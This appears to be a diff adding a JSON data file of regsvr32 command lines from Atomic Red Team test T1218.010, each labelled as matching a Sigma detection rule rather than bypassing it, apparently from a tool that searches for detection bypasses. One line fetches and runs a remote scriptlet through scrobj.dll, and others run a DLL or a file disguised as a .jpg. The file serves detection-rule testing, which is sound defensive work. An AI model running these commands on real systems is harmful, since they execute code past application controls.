@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe  /s /u /i:\"C:\\AtomicRedTeam\\atomics\\T1218.010\\src\\RegSvr32.sct\" scrobj.dll",
+    "explanation": "This command is a direct match to the Sigma rule's detection criteria. It is a true positive and not a bypass."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "This command is a direct match to the Sigma rule's detection criteria. It is a true positive and not a bypass."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe  /s C:\\Users\\thaim\\AppData\\Local\\Temp\\shell32.jpg",
+    "explanation": "This command is a direct match to the Sigma rule's detection criteria. It is a true positive and not a bypass."
+  },
+  {
+    "output": "C:\\Windows\\syswow64\\regsvr32.exe  /s C:\\AtomicRedTeam\\atomics\\T1218.010\\bin\\AllTheThingsx86.dll",
+    "explanation": "This command is a direct match to the Sigma rule's detection criteria. It is a true positive and not a bypass."
+  },
+  {
+    "output": "",
+    "explanation": "No safe bypass command can be generated."
+  }
+]
